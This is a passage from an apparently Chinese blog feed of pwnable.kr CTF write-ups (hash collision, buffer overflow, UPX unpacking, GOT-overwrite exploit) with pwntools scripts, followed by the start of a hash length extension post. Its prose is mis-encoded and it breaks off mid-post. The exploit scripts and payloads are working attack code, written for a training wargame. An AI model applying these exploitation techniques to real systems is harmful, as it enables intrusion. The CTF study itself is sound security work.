hash collision today.<br>I wanna do something like that too!</p><p>ssh col@pwnable.kr -p2222 (pw:guest)</p></blockquote><p>åŒæ ·ç»™å‡ºäº†æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check_password å‡½æ•°æŠŠä¼ å…¥çš„æ•°ç»„ä¸­çš„æ•°æ®ï¼ˆchar ç±»å‹ï¼‰è½¬æ¢ä¸º int ç±»å‹åæ±‚å’Œï¼Œæ€»å…±æœ‰ 5 ä¸ªæ•°ï¼Œè€Œä¸€ä¸ª int å å››ä¸ªå­—èŠ‚ï¼Œé•¿åº¦åˆšå¥½ä¸º 20 bytes ï¼Œæ»¡è¶³è¦æ±‚ã€‚</p><p>æ¥ç€æ„é€ éœ€è¦ä¼ å…¥çš„æ•°æ®ã€‚è¦ä½¿ç»“æœç­‰äº 0x21DD09EC ï¼Œå¯ä»¥å…ˆå°† (568134124+1) / 5 =  113626825 ã€‚å‰å››ç»„æ•°æ®ä¸º 113626825ï¼Œç¬¬äº”ç»„éœ€è¦å‡ä¸ª 1ï¼ˆå³ 113626824ï¼‰ã€‚è½¬æ¢ä¸€ä¸‹ç±»å‹å°±æ˜¯ â€˜0x6c5cec9â€™ * 4 + â€˜0x6c5cec8â€™ ï¼Œå³ â€˜\x06\xc5\xce\xc9â€™ * 4 + â€˜\x06\xc5\xce\xc8â€™ã€‚</p><p>å› ä¸ºç›®æ ‡æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯å°ç«¯åºå­˜å‚¨ï¼Œæœ€åéœ€è¦æŠŠä¼ å…¥çš„å­—ç¬¦åä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c <span class="string">"print '\xc9\xce\xc5\x06' * 4 + '\xc8\xce\xc5\x06'"</span>`</span><br></pre></td></tr></table></figure><p>poc: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh = ssh(host = <span class="string">'pwnable.kr'</span>, user = <span class="string">'col'</span>, password = <span class="string">'guest'</span>, port = <span class="number">2222</span>)</span><br><span class="line"><span class="keyword">print</span> (pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">data = <span class="string">'\xc9\xce\xc5\x06'</span> * <span class="number">4</span> + <span class="string">'\xc8\xce\xc5\x06'</span></span><br><span class="line">sh = pwn_ssh.process(argv = [<span class="string">'col'</span>, data], executable = <span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> (sh.recvall())</span><br></pre></td></tr></table></figure><p><code>daddy! I just managed to create a hash collision :)</code></p><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><blockquote><p>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p><p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></p><p>Running at : nc pwnable.kr 9000</p></blockquote><p>bof.c : </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€é“å…³äºç¼“å†²åŒºæº¢å‡ºçš„é¢˜ï¼Œéœ€è¦é€šè¿‡ overflow æ¥è¦†ç›– key çš„å€¼ã€‚</p><p>ida è½½å…¥åè¿›å…¥ func å‡½æ•°ï¼š</p><p><img src="/posts/pwnable-kr/bof-1.png" alt=""></p><p>å¯ä»¥æ‰¾åˆ° a1 çš„åœ°å€ä¸º ebp+8h ï¼Œs çš„åœ°å€ä¸º ebp-2Chï¼Œè·ç¦»å·® 52ï¼Œæ‰€ä»¥è¦è¦†ç›– 52 ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">"print 'A'*52 + '\xbe\xba\xfe\xca'"</span>; cat) | nc pwnable.kr <span class="number">9000</span> </span><br><span class="line"><span class="comment"># åŒæ ·éœ€è¦æ³¨æ„åé¢çš„å­—ç¬¦éœ€è¦å€’åºä¼ å…¥ï¼›å¦å¤–è¿™é‡Œçš„ cat æ—¢èƒ½è®© nc çš„ tcp ä¼šè¯ä¸ç»“æŸï¼ˆç›´åˆ°ç”¨æˆ·è¾“å…¥ Ctrl+Cï¼‰ï¼Œåˆå¯ä»¥å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹é‡å®šå‘ç»™ ncã€‚</span></span><br></pre></td></tr></table></figure><p>exp: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_socket = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line">pwn_socket.sendline(<span class="string">'A'</span> * <span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span>)</span><br><span class="line"></span><br><span class="line">pwn_socket.interactive()</span><br></pre></td></tr></table></figure><p><code>daddy, I just pwned a buFFer :)</code></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><blockquote><p>Papa brought me a packed present! letâ€™s open it.</p><p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></p><p>This is reversing task. all you need is binary</p></blockquote><p>ida è½½å…¥åå‘ç°å­—ç¬¦ä¸²ï¼šâ€This file is packed with the UPXâ€ï¼Œé‚£å°±ç”¨ upx å»è§£å¯† elfã€‚</p><p>é¦–å…ˆå®‰è£… upx : </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install upx-ucl</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œå‘½ä»¤è§£å‹ : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx <span class="_">-d</span> flag</span><br></pre></td></tr></table></figure><p>é‡æ–°ç”¨ ida è½½å…¥åæ‰¾åˆ° flag ï¼š</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="string">rodata:</span><span class="number">0000000000496628</span> aUpxSoundsLikeA db <span class="string">'UPX...? sounds like a delivery service :)'</span>,<span class="number">0</span></span><br><span class="line">.<span class="string">rodata:</span><span class="number">0000000000496628</span>                                         ; DATA <span class="string">XREF:</span> .<span class="string">data:</span>flagâ†“o</span><br></pre></td></tr></table></figure><p><code>UPX...? sounds like a delivery service :)</code></p><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><blockquote><p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p><p>ssh passcode@pwnable.kr -p2222 (pw:guest)</p></blockquote><p>æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login() ä¸­ä¸¤ä¸ª scanf éƒ½æ²¡æœ‰å–åœ°å€ï¼Œè¿™ä¼šå¯¼è‡´ç¨‹åºä½¿ç”¨ä¸¤ä¸ª passcode çš„å€¼ä½œä¸ºå­˜å‚¨è¾“å…¥çš„åœ°å€ï¼Œå¦‚æœåœ°å€ä¸å¯å†™å°±ä¼šé€ æˆç¨‹åºå†…éƒ¨é”™è¯¯ã€‚</p><p>è¿™æ ·å°±ä¸èƒ½ç›´æ¥å†™å…¥ç‰¹å®šçš„ passcode å€¼äº†ï¼Œæ€è·¯æ˜¯ GOT è¡¨è¦†å†™ã€‚</p><p>ç”±äº welcome() å’Œ login() å‡½æ•°æ˜¯è¿ç»­è°ƒç”¨çš„ï¼Œå¯¼è‡´å®ƒä»¬æœ‰ç›¸åŒçš„åœ°å€ï¼Œä»ä¸‹é¢è¿™ä¸¤æ®µä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå®ƒä»¬éƒ½åœ¨ esp+18h çš„ä½ç½®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+18h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%100s"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"checking..."</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">338150</span> || v2 != <span class="number">13371337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Login Failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Login OK!"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ · name å’Œ passcode1 å°±å­˜åœ¨äºç›¸åŒçš„æ ˆç©ºé—´äº†ã€‚name çš„åœ°å€ä¸º ebp-70h ï¼Œpasscode1 çš„åœ°å€ä¸º ebp-10h ï¼Œä¸¤è€…ç›¸è· 96 ä¸ªå­—èŠ‚ï¼Œæœ‰ 4 ä¸ªå­—èŠ‚çš„ä»»æ„åœ°å€å†™ã€‚æˆ‘ä»¬å¯ä»¥æŠŠ passcode1 è¦†ç›–ä¸º fflush çš„åœ°å€ï¼Œç„¶ååˆ©ç”¨ scanf æŠŠ system çš„åœ°å€å†™è¿‡å»ï¼Œè¿™æ ·ç­‰æ‰§è¡Œ fflush æ—¶å°±èƒ½æ‰§è¡Œ system äº†ï¼ˆå³æŠŠ fflush çš„ GOT è¡¨å€¼æ”¹ä¸º 080485E3 ï¼‰ã€‚</p><p>system çš„åœ°å€ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">text</span>:<span class="number">080485E3</span>                 mov     dword ptr [esp], <span class="built_in">offset</span> <span class="keyword">command</span> ; <span class="string">"/bin/cat flag"</span></span><br><span class="line">.<span class="keyword">text</span>:<span class="number">080485</span>EA                 call    <span class="title">_system</span></span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./passcode'</span>)</span><br><span class="line">cn = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'passcode'</span>, password=<span class="string">'guest'</span>, port=<span class="number">2222</span>).process(<span class="string">"./passcode"</span>)</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'a'</span>*<span class="number">96</span> + p32(bin.got[<span class="string">'fflush'</span>]))</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">cn.sendline(str(<span class="number">0x080485E3</span>))</span><br><span class="line"><span class="keyword">print</span> cn.recv()</span><br></pre></td></tr></table></figure><p>å†è®°å½•ä¸¤æ¡å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump <span class="_">-d</span> passcode</span><br><span class="line">readelf -r passcode</span><br></pre></td></tr></table></figure><p><code>Sorry mom.. I got confused about scanf usage :(</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å­¦ä¹ ä¸€ä¸‹ Pwn ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘å€ï¼š&lt;a href=&quot;http://pwnable.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pwnable.kr&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="https://cyris.pen.moe/categories/Pwn/"/>
    
    
      <category term="CTF" scheme="https://cyris.pen.moe/tags/CTF/"/>
    
      <category term="PWN" scheme="https://cyris.pen.moe/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</title>
    <link href="https://cyris.pen.moe/posts/hash-extender-attack/"/>
    <id>https://cyris.pen.moe/posts/hash-extender-attack/</id>
    <published>2018-02-02T09:00:58.000Z</published>
    <updated>2018-04-01T06:19:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åˆ©ç”¨äº† MD5 ï¼ŒSHA1 ç­‰åŠ å¯†ç®—æ³•çš„ç¼ºé™·ï¼Œå¯ä»¥åœ¨ä¸çŸ¥é“åŸå§‹å¯†é’¥çš„æƒ…å†µä¸‹è®¡ç®—å‡ºä¸€ä¸ªå¯¹åº”çš„ hash å€¼ã€‚</p><a id="more"></a><h2 id="0x00-å¼•è¨€"><a href="#0x00-å¼•è¨€" class="headerlink" title="0x00 å¼•è¨€"></a>0x00 å¼•è¨€</h2><p>åšé¢˜çš„æ—¶å€™çœ‹åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼ŒæŒºå¥½ç©çš„ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><p>é¢˜ç›®ä¸­çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $auth = <span class="keyword">false</span>;</span><br><span class="line">    $role = <span class="string">"guest"</span>;   </span><br><span class="line">    $salt = ;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">        $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </span><br><span class="line">            $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;&#125;   </span><br><span class="line">        $s = serialize($role);</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.strrev($s));</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼š<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></p></blockquote><h2 id="0x01-ç®€å•äº†è§£hashå‡½æ•°"><a href="#0x01-ç®€å•äº†è§£hashå‡½æ•°" class="headerlink" title="0x01 ç®€å•äº†è§£hashå‡½æ•°"></a>0x01 ç®€å•äº†è§£hashå‡½æ•°</h2><p>å“ˆå¸Œå‡½æ•°ä»¥åŒºå—ä¸ºå•ä½æ“ä½œæ•°æ®ã€‚è¯¸å¦‚MD5, SHA1, SHA256çš„åŒºå—é•¿åº¦éƒ½æ˜¯512 bits ã€‚å¤§å¤šæ•° message çš„é•¿åº¦ä¸ä¼šåˆšå¥½å¯ä»¥è¢«å“ˆå¸Œå‡½æ•°çš„åŒºå—é•¿åº¦æ•´é™¤ã€‚å› æ­¤ message å°±å¿…é¡»è¢«å¡«å……ï¼ˆ padding ï¼‰è‡³åŒºå—é•¿åº¦çš„æ•´æ•°å€ã€‚</p><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹MD5çš„åŠ å¯†åŸç†ï¼Œè¯¦ç»†çš„æè¿°å¯ä»¥å‚è€ƒ <a href="https://www.ietf.org/rfc/rfc1321.txt" target="_blank" rel="noopener">RFC1321</a></p><p>MD5æ˜¯è¾“å…¥ä¸å®šé•¿åº¦ä¿¡æ¯ï¼Œè¾“å‡ºå›ºå®šé•¿åº¦128-bitsçš„ç®—æ³•ã€‚å³ä½¿åŸæ–‡ä¸­å‡ºç°ä¸€ä¸ªå¾®å°çš„å˜åŒ–ï¼Œå…¶æ•£åˆ—ç»“æœä¹Ÿä¼šå‘ç”Ÿå·¨å¤§å˜åŒ–ã€‚ç©ºæ–‡çš„æ•£åˆ—ä¸ºï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">MD5</span><span class="params">(<span class="string">""</span>)</span></span> = 